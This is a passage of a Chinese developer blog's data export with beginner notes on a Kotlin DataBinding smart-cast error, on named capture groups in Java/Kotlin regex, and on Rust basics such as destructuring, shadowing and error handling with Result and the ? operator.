Studio没有给之前错误的用法标红，我觉得这个还是应该标个红的。\n\n","slug":"problem-databinding","published":1,"updated":"2022-11-24T02:48:20.735Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clbx23jtr0024sfklgnvq6hh0","content":"<h1 id=\"在DataBinding的使用过程中踩的坑\"><a href=\"#在DataBinding的使用过程中踩的坑\" class=\"headerlink\" title=\"在DataBinding的使用过程中踩的坑\"></a>在DataBinding的使用过程中踩的坑</h1><p>今天初次尝试了DataBinding，之前一直在用ViewBinding。今天欣喜的发现DataBinding包含了ViewBinding的全部功能，绝绝子。</p>\n<p>DataBinding对于基于MVVM架构理念设计的Android程序来说非常有意义，它可以进一步解耦。</p>\n<p>不说了，来看看我今天遇到的具体问题</p>\n<blockquote>\n<p>DataBinding可能会导致Kotlin编译器无法smart cast, 而IDE不会标红</p>\n</blockquote>\n<p>我在布局文件activity_login.xml中给布局绑定了这样一个变量</p>\n<pre class=\"line-numbers language-markup\" data-language=\"markup\"><code class=\"language-markup\"><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>data</span><span class=\"token punctuation\">&gt;</span></span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>variable</span>\n        <span class=\"token attr-name\">name</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>viewModel<span class=\"token punctuation\">\"</span></span>\n        <span class=\"token attr-name\">type</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>kim.bifrost.coldrain.wanandroid.viewmodel.LoginViewModel<span class=\"token punctuation\">\"</span></span> <span class=\"token punctuation\">/&gt;</span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>data</span><span class=\"token punctuation\">&gt;</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>如你所见，我在代码中准备使用它</p>\n<pre class=\"line-numbers language-kotlin\" data-language=\"kotlin\"><code class=\"language-kotlin\">binding<span class=\"token punctuation\">.</span>viewModel<span class=\"token punctuation\">.</span><span class=\"token function\">postLogin</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>这行代码在IDE中并没有标红，但无法通过编译</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">e: E:\\ColdRain_Moro\\AndroidProject\\WanAndroid\\app\\src\\main\\java\\kim\\bifrost\\coldrain\\wanandroid\\view\\activity\\LoginActivity.kt: (31, 13): Smart cast to 'LoginViewModel' is impossible, because 'binding.viewModel' is a complex expression<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>遇事不决问度娘，于是在百度上找到了答案 (<a href=\"https://www.javaer101.com/article/52202734.html\">在Kotlin中无法进行Smart Cast - Javaer101</a>)</p>\n<p>原来这个viewModel变量的类型实际上是LoginViewModel?，也就是它是允许为空的。而我获取的时候是直接以LoginViewModel的形式获取，它没有办法从LoginViewModel?类型smart cast为LoginViewModel。</p>\n<p>那么在调用的时候后面加个?就解决了。</p>\n<pre class=\"line-numbers language-kotlin\" data-language=\"kotlin\"><code class=\"language-kotlin\">binding<span class=\"token punctuation\">.</span>viewModel<span class=\"token operator\">?</span><span class=\"token punctuation\">.</span><span class=\"token function\">postLogin</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>之所以记录下来，是因为Android Studio没有给之前错误的用法标红，我觉得这个还是应该标个红的。</p>\n","site":{"data":{"friends":[{"avatar":"https://avatars.githubusercontent.com/u/59405399?v=4","name":"iGxnon","introduction":"Keep Learning...","url":"https://blog.skygard.cn/","title":"前去拜访"},{"avatar":"https://avatars.githubusercontent.com/u/46246823?v=4","name":"StellarisW","introduction":"Devops in Go💕","url":"https://blog.stellaris.wang/","title":"前去拜访"}]}},"excerpt":"","more":"<h1 id=\"在DataBinding的使用过程中踩的坑\"><a href=\"#在DataBinding的使用过程中踩的坑\" class=\"headerlink\" title=\"在DataBinding的使用过程中踩的坑\"></a>在DataBinding的使用过程中踩的坑</h1><p>今天初次尝试了DataBinding，之前一直在用ViewBinding。今天欣喜的发现DataBinding包含了ViewBinding的全部功能，绝绝子。</p>\n<p>DataBinding对于基于MVVM架构理念设计的Android程序来说非常有意义，它可以进一步解耦。</p>\n<p>不说了，来看看我今天遇到的具体问题</p>\n<blockquote>\n<p>DataBinding可能会导致Kotlin编译器无法smart cast, 而IDE不会标红</p>\n</blockquote>\n<p>我在布局文件activity_login.xml中给布局绑定了这样一个变量</p>\n<pre class=\"line-numbers language-markup\" data-language=\"markup\"><code class=\"language-markup\"><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>data</span><span class=\"token punctuation\">></span></span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>variable</span>\n        <span class=\"token attr-name\">name</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>viewModel<span class=\"token punctuation\">\"</span></span>\n        <span class=\"token attr-name\">type</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>kim.bifrost.coldrain.wanandroid.viewmodel.LoginViewModel<span class=\"token punctuation\">\"</span></span> <span class=\"token punctuation\">/></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>data</span><span class=\"token punctuation\">></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>如你所见，我在代码中准备使用它</p>\n<pre class=\"line-numbers language-kotlin\" data-language=\"kotlin\"><code class=\"language-kotlin\">binding<span class=\"token punctuation\">.</span>viewModel<span class=\"token punctuation\">.</span><span class=\"token function\">postLogin</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>这行代码在IDE中并没有标红，但无法通过编译</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">e: E:\\ColdRain_Moro\\AndroidProject\\WanAndroid\\app\\src\\main\\java\\kim\\bifrost\\coldrain\\wanandroid\\view\\activity\\LoginActivity.kt: (31, 13): Smart cast to &#39;LoginViewModel&#39; is impossible, because &#39;binding.viewModel&#39; is a complex expression<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>遇事不决问度娘，于是在百度上找到了答案 (<a href=\"https://www.javaer101.com/article/52202734.html\">在Kotlin中无法进行Smart Cast - Javaer101</a>)</p>\n<p>原来这个viewModel变量的类型实际上是LoginViewModel?，也就是它是允许为空的。而我获取的时候是直接以LoginViewModel的形式获取，它没有办法从LoginViewModel?类型smart cast为LoginViewModel。</p>\n<p>那么在调用的时候后面加个?就解决了。</p>\n<pre class=\"line-numbers language-kotlin\" data-language=\"kotlin\"><code class=\"language-kotlin\">binding<span class=\"token punctuation\">.</span>viewModel<span class=\"token operator\">?</span><span class=\"token punctuation\">.</span><span class=\"token function\">postLogin</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>之所以记录下来，是因为Android Studio没有给之前错误的用法标红，我觉得这个还是应该标个红的。</p>\n"},{"title":"正则表达式捕获组在Java/Kotlin中的使用","date":"2021-07-21T15:21:11.000Z","author":"寒雨","hide":false,"summary":"记录下java的正则表达式捕获组的使用","_content":"\n## 传统方式：使用捕获组序数来获取捕获组捕获到的内容\n\n上代码\n\n```kotlin\nval pattern = Pattern.compile(\"(//d+)(//S+)\")\nval matcher = pattern.matcher(\"2021BifrostCraft\")\nif (matcher.find()) {\n    print(matcher.group())\n    print(matcher.group(1))\n    print(matcher.group(2))\n}\n// 输出结果是:2021BifrostCraft,2021,BifrostCraft\n```\n\n但有时我们不知道Pattern中一共有多少个捕获组，也就不知道我们需要获取的捕获组的序号\n\n这个问题一度困扰了我很久\n\n直到我了解到命名捕获组这种做法\n\n## 命名捕获组\n\n**每个以左括号开始的捕获组，都紧跟着“?”，而后才是正则表达式。**\n\n先上代码\n\n```kotlin\nval pattern = Pattern.compile(\"(?<number>//d+)(?<word>//S+)\")\nval matcher = pattern.matcher(\"2021BifrostCraft\")\nif (matcher.find()) {\n    print(matcher.group())\n    print(matcher.group(\"number\"))\n    print(matcher.group(\"word\"))\n}\n// 输出结果是:2021BifrostCraft,2021,BifrostCraft\n```\n\n这样做，即使我们不知道我们的pattern里面有多少捕获组，也不知道我们需要的捕获组的序号，我们仍然能获取到我们想要得到得捕获组的内容","source":"_posts/regex-matcher.md","raw":"---\ntitle: 正则表达式捕获组在Java/Kotlin中的使用\ndate: 2021-07-21 23:21:11\nauthor: 寒雨\nhide: false\nsummary: 记录下java的正则表达式捕获组的使用\ncategories: 笔记\ntags:\n  - Kotlin\n  - Java\n---\n\n## 传统方式：使用捕获组序数来获取捕获组捕获到的内容\n\n上代码\n\n```kotlin\nval pattern = Pattern.compile(\"(//d+)(//S+)\")\nval matcher = pattern.matcher(\"2021BifrostCraft\")\nif (matcher.find()) {\n    print(matcher.group())\n    print(matcher.group(1))\n    print(matcher.group(2))\n}\n// 输出结果是:2021BifrostCraft,2021,BifrostCraft\n```\n\n但有时我们不知道Pattern中一共有多少个捕获组，也就不知道我们需要获取的捕获组的序号\n\n这个问题一度困扰了我很久\n\n直到我了解到命名捕获组这种做法\n\n## 命名捕获组\n\n**每个以左括号开始的捕获组，都紧跟着“?”，而后才是正则表达式。**\n\n先上代码\n\n```kotlin\nval pattern = Pattern.compile(\"(?<number>//d+)(?<word>//S+)\")\nval matcher = pattern.matcher(\"2021BifrostCraft\")\nif (matcher.find()) {\n    print(matcher.group())\n    print(matcher.group(\"number\"))\n    print(matcher.group(\"word\"))\n}\n// 输出结果是:2021BifrostCraft,2021,BifrostCraft\n```\n\n这样做，即使我们不知道我们的pattern里面有多少捕获组，也不知道我们需要的捕获组的序号，我们仍然能获取到我们想要得到得捕获组的内容","slug":"regex-matcher","published":1,"updated":"2022-12-12T15:53:01.494Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clbx23jts0027sfkl9j2b3f4m","content":"<h2 id=\"传统方式：使用捕获组序数来获取捕获组捕获到的内容\"><a href=\"#传统方式：使用捕获组序数来获取捕获组捕获到的内容\" class=\"headerlink\" title=\"传统方式：使用捕获组序数来获取捕获组捕获到的内容\"></a>传统方式：使用捕获组序数来获取捕获组捕获到的内容</h2><p>上代码</p>\n<pre class=\"line-numbers language-kotlin\" data-language=\"kotlin\"><code class=\"language-kotlin\"><span class=\"token keyword\">val</span> pattern <span class=\"token operator\">=</span> Pattern<span class=\"token punctuation\">.</span><span class=\"token function\">compile</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"(//d+)(//S+)\"</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">val</span> matcher <span class=\"token operator\">=</span> pattern<span class=\"token punctuation\">.</span><span class=\"token function\">matcher</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"2021BifrostCraft\"</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>matcher<span class=\"token punctuation\">.</span><span class=\"token function\">find</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token function\">print</span><span class=\"token punctuation\">(</span>matcher<span class=\"token punctuation\">.</span><span class=\"token function\">group</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    <span class=\"token function\">print</span><span class=\"token punctuation\">(</span>matcher<span class=\"token punctuation\">.</span><span class=\"token function\">group</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    <span class=\"token function\">print</span><span class=\"token punctuation\">(</span>matcher<span class=\"token punctuation\">.</span><span class=\"token function\">group</span><span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">}</span>\n<span class=\"token comment\">// 输出结果是:2021BifrostCraft,2021,BifrostCraft</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>但有时我们不知道Pattern中一共有多少个捕获组，也就不知道我们需要获取的捕获组的序号</p>\n<p>这个问题一度困扰了我很久</p>\n<p>直到我了解到命名捕获组这种做法</p>\n<h2 id=\"命名捕获组\"><a href=\"#命名捕获组\" class=\"headerlink\" title=\"命名捕获组\"></a>命名捕获组</h2><p><strong>每个以左括号开始的捕获组，都紧跟着“?”，而后才是正则表达式。</strong></p>\n<p>先上代码</p>\n<pre class=\"line-numbers language-kotlin\" data-language=\"kotlin\"><code class=\"language-kotlin\"><span class=\"token keyword\">val</span> pattern <span class=\"token operator\">=</span> Pattern<span class=\"token punctuation\">.</span><span class=\"token function\">compile</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"(?&lt;number&gt;//d+)(?&lt;word&gt;//S+)\"</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">val</span> matcher <span class=\"token operator\">=</span> pattern<span class=\"token punctuation\">.</span><span class=\"token function\">matcher</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"2021BifrostCraft\"</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>matcher<span class=\"token punctuation\">.</span><span class=\"token function\">find</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token function\">print</span><span class=\"token punctuation\">(</span>matcher<span class=\"token punctuation\">.</span><span class=\"token function\">group</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    <span class=\"token function\">print</span><span class=\"token punctuation\">(</span>matcher<span class=\"token punctuation\">.</span><span class=\"token function\">group</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"number\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    <span class=\"token function\">print</span><span class=\"token punctuation\">(</span>matcher<span class=\"token punctuation\">.</span><span class=\"token function\">group</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"word\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">}</span>\n<span class=\"token comment\">// 输出结果是:2021BifrostCraft,2021,BifrostCraft</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>这样做，即使我们不知道我们的pattern里面有多少捕获组，也不知道我们需要的捕获组的序号，我们仍然能获取到我们想要得到得捕获组的内容</p>\n","site":{"data":{"friends":[{"avatar":"https://avatars.githubusercontent.com/u/59405399?v=4","name":"iGxnon","introduction":"Keep Learning...","url":"https://blog.skygard.cn/","title":"前去拜访"},{"avatar":"https://avatars.githubusercontent.com/u/46246823?v=4","name":"StellarisW","introduction":"Devops in Go💕","url":"https://blog.stellaris.wang/","title":"前去拜访"}]}},"excerpt":"","more":"<h2 id=\"传统方式：使用捕获组序数来获取捕获组捕获到的内容\"><a href=\"#传统方式：使用捕获组序数来获取捕获组捕获到的内容\" class=\"headerlink\" title=\"传统方式：使用捕获组序数来获取捕获组捕获到的内容\"></a>传统方式：使用捕获组序数来获取捕获组捕获到的内容</h2><p>上代码</p>\n<pre class=\"line-numbers language-kotlin\" data-language=\"kotlin\"><code class=\"language-kotlin\"><span class=\"token keyword\">val</span> pattern <span class=\"token operator\">=</span> Pattern<span class=\"token punctuation\">.</span><span class=\"token function\">compile</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"(//d+)(//S+)\"</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">val</span> matcher <span class=\"token operator\">=</span> pattern<span class=\"token punctuation\">.</span><span class=\"token function\">matcher</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"2021BifrostCraft\"</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>matcher<span class=\"token punctuation\">.</span><span class=\"token function\">find</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token function\">print</span><span class=\"token punctuation\">(</span>matcher<span class=\"token punctuation\">.</span><span class=\"token function\">group</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    <span class=\"token function\">print</span><span class=\"token punctuation\">(</span>matcher<span class=\"token punctuation\">.</span><span class=\"token function\">group</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    <span class=\"token function\">print</span><span class=\"token punctuation\">(</span>matcher<span class=\"token punctuation\">.</span><span class=\"token function\">group</span><span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token comment\">// 输出结果是:2021BifrostCraft,2021,BifrostCraft</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>但有时我们不知道Pattern中一共有多少个捕获组，也就不知道我们需要获取的捕获组的序号</p>\n<p>这个问题一度困扰了我很久</p>\n<p>直到我了解到命名捕获组这种做法</p>\n<h2 id=\"命名捕获组\"><a href=\"#命名捕获组\" class=\"headerlink\" title=\"命名捕获组\"></a>命名捕获组</h2><p><strong>每个以左括号开始的捕获组，都紧跟着“?”，而后才是正则表达式。</strong></p>\n<p>先上代码</p>\n<pre class=\"line-numbers language-kotlin\" data-language=\"kotlin\"><code class=\"language-kotlin\"><span class=\"token keyword\">val</span> pattern <span class=\"token operator\">=</span> Pattern<span class=\"token punctuation\">.</span><span class=\"token function\">compile</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"(?&lt;number>//d+)(?&lt;word>//S+)\"</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">val</span> matcher <span class=\"token operator\">=</span> pattern<span class=\"token punctuation\">.</span><span class=\"token function\">matcher</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"2021BifrostCraft\"</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>matcher<span class=\"token punctuation\">.</span><span class=\"token function\">find</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token function\">print</span><span class=\"token punctuation\">(</span>matcher<span class=\"token punctuation\">.</span><span class=\"token function\">group</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    <span class=\"token function\">print</span><span class=\"token punctuation\">(</span>matcher<span class=\"token punctuation\">.</span><span class=\"token function\">group</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"number\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    <span class=\"token function\">print</span><span class=\"token punctuation\">(</span>matcher<span class=\"token punctuation\">.</span><span class=\"token function\">group</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"word\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token comment\">// 输出结果是:2021BifrostCraft,2021,BifrostCraft</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>这样做，即使我们不知道我们的pattern里面有多少捕获组，也不知道我们需要的捕获组的序号，我们仍然能获取到我们想要得到得捕获组的内容</p>\n"},{"title":"Rust笔记其一","date":"2022-05-18T16:00:00.000Z","author":"寒雨","hide":false,"summary":"变量绑定&解构语法&变量遮蔽&类型推导&异常处理","_content":"\n# Rust笔记其一\n\n## 变量绑定\n\n> 在其它语言中，我们用 `var a = \"hello world\"` 的方式给 `a` 赋值，也就是把等式右边的 `\"hello world\"` 字符串赋值给变量 `a` ，而在 Rust 中，我们这样写： `let a = \"hello world\"` ，同时给这个过程起了另一个名字：**变量绑定**。\n>\n> 为何不用赋值而用绑定呢（其实你也可以称之为赋值，但是绑定的含义更清晰准确）？这里就涉及 Rust 最核心的原则——**所有权**，简单来讲，任何内存对象都是有主人的，而且一般情况下完全属于它的主人，绑定就是把这个对象绑定给一个变量，让这个变量成为它的主人（聪明的读者应该能猜到，在这种情况下，该对象之前的主人就会丧失对该对象的所有权），像极了我们的现实世界，不是吗？\n>\n> 摘自 《Rust Course》\n\n## 解构语法\n\n~~~rust\nstruct Struct {\n    e: i32\n}\n\nfn main() {\n    let (a, b);\n\n    a = 1;\n    b = 2;\n    // 数组解构\n    let [c,..,d,_] = [1, 2, 3, 4, 5];\n    // 结构体解构\n    let Struct { e, .. } = Struct { e: 5 };\n\n    assert_eq!([1, 2, 1, 4, 5], [a, b, c, d, e]);\n}\n~~~\n\n## 变量遮蔽(shadowing)\n\nRust 允许声明相同的变量名，在后面声明的变量会遮蔽掉前面声明的，如下所示：\n\n```rust\nfn main() {\n    let x = 5;\n    // 在main函数的作用域内对之前的x进行遮蔽\n    let x = x + 1;\n\n    {\n        // 在当前的花括号作用域内，对之前的x进行遮蔽\n        let x = x * 2;\n        println!(\"The value of x in the inner scope is: {}\", x);\n    }\n\n    println!(\"The value of x is: {}\", x);\n}\n```\n\n## 类型推导\n\n个人感觉比较类似kt的类型推导吧，要么声明变量类型，要么指定泛型\n\n~~~rust\nlet guess = \"42\".parse().except(\"Not a number\"); // 报错，无法推断你想要parse的类型\nlet guess: i32 = \"42\".parse().except(\"Not a number\"); // √\nlet guess = \"42\".parse::<i32>().expect(\"Not a number!\"); // √\n~~~\n\nrust的泛型还要打::，挺怪，但能接受。\n\n## 异常处理\n\n> ## Rust 的错误哲学\n>\n> 错误对于软件来说是不可避免的，因此一门优秀的编程语言必须有其完整的错误处理哲学。在很多情况下，Rust 需要你承认自己的代码可能会出错，并提前采取行动，来处理这些错误。\n>\n> Rust 中的错误主要分为两类：\n>\n> - **可恢复错误**，通常用于从系统全局角度来看可以接受的错误，例如处理用户的访问、操作等错误，这些错误只会影响某个用户自身的操作进程，而不会对系统的全局稳定性产生影响\n> - **不可恢复错误**，刚好相反，该错误通常是全局性或者系统性的错误，例如数组越界访问，系统启动时发生了影响启动流程的错误等等，这些错误的影响往往对于系统来说是致命的\n>\n> 很多编程语言，并不会区分这些错误，而是直接采用异常的方式去处理。Rust 没有异常，但是 Rust 也有自己的卧龙凤雏：`Result<T, E>` 用于可恢复错误，`panic!` 用于不可恢复错误。\n>\n> 摘自 《Rust Crouse》\n\n我们可以直接使用`panic!`来抛出一个异常，让程序直接崩溃，但一般我们不会这么做。一般我们会大量的使用`Result`来进行异常的传递，毕竟Rust里是没有try catch的，而我们抛出异常的目的一般不会是直接让整个程序崩溃，而是要让其他人去处理这个异常。\n\n讲真，我觉得rust的异常处理设计得简直一级棒，比go和java的不知道高到哪里去了，kotlin的Result API也不过是是对其拙劣的模仿（暴论）~\n\n~~~rust\n// expect 如产生错误 直接panic!\nlet guess = \"42\".parse::<i32>().expect(\"Not a number!\");\n\n// 比较类似go的异常处理方式，不过语法更加好看\n// 不过这种方式写多了会造成多层嵌套\nlet guess = \"42\".parse::<i32>();\nmatch guess {\n    Ok(num) => println!(\"You guessed: {}\", num),\n    Err(err) => println!(\"Error: {}\", err),\n}\n~~~\n\n同时，为了避免模板代码，rust有一个`?`的语法糖，可以在返回值为Result的函数中使用\n\n~~~rust\nuse core::time;\nuse std::{fs::OpenOptions, thread, io::Write};\n\nfn main() -> std::io::Result<()> {\n    let mut f = OpenOptions::new().write(true).open(\"hello.txt\")?; // <-\n    print!(\"{:?} \\n\", f);\n    // on the moment, manually remove the file hello.txt\n    let ten_millis = time::Duration::from_millis(10000);\n    thread::sleep(ten_millis);\n    print!(\"{:?} \\n\", f);\n    let r = f.write_all(b\"Hello, world!\")?;\n    print!(\"Result is {:?} \\n\", r);\n    drop(f);\n    Ok(())\n}\n~~~\n\n这个`?`对应的模板代码如下\n\n~~~rust\nlet f = OpenOptions::new().write(true).open(\"hello.txt\");\nlet mut f = match f{\n    Ok(file) => file,\n    Err(e) => return Err(e),\n};\n~~~\n\n如此便大幅简化了开发流程，实属厉害\n\n那么，rust有没有办法捕获异常呢\n\n有\n\n> 最后，再来说个例外，`panic::catch_unwind`。\n>\n> 先看下它的用法：\n>\n> ```rust\n> use std::panic;\n> \n> let result = panic::catch_unwind(|| {\n>     println!(\"hello!\");\n> });\n> assert!(result.is_ok());\n> \n> let result = panic::catch_unwind(|| {\n>     panic!(\"oh no!\");\n> });\n> assert!(result.is_err());\n> ```\n>\n> 没错，它的行为几乎就是try/catch了：panic！宏被捕获了，程序并也没有挂，返回了Err。尽管如此，Rust的目的并不是让它成为try/catch机制的实现，而是当Rust和其他编程语言互动时，避免其他语言代码块throw出异常。所以呢，错误处理的正道还是用**Result**。\n>\n> 从catch_unwind的名字上，需要留意下unwind这个限定词，它意味着只有默认进行栈反解的panic可以被捕获到，如果是设为直接终止程序的panic，就逮不住了。\n>\n> 细节可进一步参考[Rust Documentation](https://link.zhihu.com/?target=https%3A//doc.rust-lang.org/beta/std/panic/fn.catch_unwind.html)。","source":"_posts/rust-note-#1.md","raw":"---\ntitle: Rust笔记其一\ndate: 2022-05-19\nauthor: 寒雨\nhide: false\nsummary: 变量绑定&解构语法&变量遮蔽&类型推导&异常处理\ncategories: 笔记\ntags:\n  - Rust\n  - Rust学习笔记\n---\n\n# Rust笔记其一\n\n## 变量绑定\n\n> 在其它语言中，我们用 `var a = \"hello world\"` 的方式给 `a` 赋值，也就是把等式右边的 `\"hello world\"` 字符串赋值给变量 `a` ，而在 Rust 中，我们这样写： `let a = \"hello world\"` ，同时给这个过程起了另一个名字：**变量绑定**。\n>\n> 为何不用赋值而用绑定呢（其实你也可以称之为赋值，但是绑定的含义更清晰准确）？这里就涉及 Rust 最核心的原则——**所有权**，简单来讲，任何内存对象都是有主人的，而且一般情况下完全属于它的主人，绑定就是把这个对象绑定给一个变量，让这个变量成为它的主人（聪明的读者应该能猜到，在这种情况下，该对象之前的主人就会丧失对该对象的所有权），像极了我们的现实世界，不是吗？\n>\n> 摘自 《Rust Course》\n\n## 解构语法\n\n~~~rust\nstruct Struct {\n    e: i32\n}\n\nfn main() {\n    let (a, b);\n\n    a = 1;\n    b = 2;\n    // 数组解构\n    let [c,..,d,_] = [1, 2, 3, 4, 5];\n    // 结构体解构\n    let Struct { e, .. } = Struct { e: 5 };\n\n    assert_eq!([1, 2, 1, 4, 5], [a, b, c, d, e]);\n}\n~~~\n\n## 变量遮蔽(shadowing)\n\nRust 允许声明相同的变量名，在后面声明的变量会遮蔽掉前面声明的，如下所示：\n\n```rust\nfn main() {\n    let x = 5;\n    // 在main函数的作用域内对之前的x进行遮蔽\n    let x = x + 1;\n\n    {\n        // 在当前的花括号作用域内，对之前的x进行遮蔽\n        let x = x * 2;\n        println!(\"The value of x in the inner scope is: {}\", x);\n    }\n\n    println!(\"The value of x is: {}\", x);\n}\n```\n\n## 类型推导\n\n个人感觉比较类似kt的类型推导吧，要么声明变量类型，要么指定泛型\n\n~~~rust\nlet guess = \"42\".parse().except(\"Not a number\"); // 报错，无法推断你想要parse的类型\nlet guess: i32 = \"42\".parse().except(\"Not a number\"); // √\nlet guess = \"42\".parse::<i32>().expect(\"Not a number!\"); // √\n~~~\n\nrust的泛型还要打::，挺怪，但能接受。\n\n## 异常处理\n\n> ## Rust 的错误哲学\n>\n> 错误对于软件来说是不可避免的，因此一门优秀的编程语言必须有其完整的错误处理哲学。在很多情况下，Rust 需要你承认自己的代码可能会出错，并提前采取行动，来处理这些错误。\n>\n> Rust 中的错误主要分为两类：\n>\n> - **可恢复错误**，通常用于从系统全局角度来看可以接受的错误，例如处理用户的访问、操作等错误，这些错误只会影响某个用户自身的操作进程，而不会对系统的全局稳定性产生影响\n> - **不可恢复错误**，刚好相反，该错误通常是全局性或者系统性的错误，例如数组越界访问，系统启动时发生了影响启动流程的错误等等，这些错误的影响往往对于系统来说是致命的\n>\n> 很多编程语言，并不会区分这些错误，而是直接采用异常的方式去处理。Rust 没有异常，但是 Rust 也有自己的卧龙凤雏：`Result<T, E>` 用于可恢复错误，`panic!` 用于不可恢复错误。\n>\n> 摘自 《Rust Crouse》\n\n我们可以直接使用`panic!`来抛出一个异常，让程序直接崩溃，但一般我们不会这么做。一般我们会大量的使用`Result`来进行异常的传递，毕竟Rust里是没有try catch的，而我们抛出异常的目的一般不会是直接让整个程序崩溃，而是要让其他人去处理这个异常。\n\n讲真，我觉得rust的异常处理设计得简直一级棒，比go和java的不知道高到哪里去了，kotlin的Result API也不过是是对其拙劣的模仿（暴论）~\n\n~~~rust\n// expect 如产生错误 直接panic!\nlet guess = \"42\".parse::<i32>().expect(\"Not a number!\");\n\n// 比较类似go的异常处理方式，不过语法更加好看\n// 不过这种方式写多了会造成多层嵌套\nlet guess = \"42\".parse::<i32>();\nmatch guess {\n    Ok(num) => println!(\"You guessed: {}\", num),\n    Err(err) => println!(\"Error: {}\", 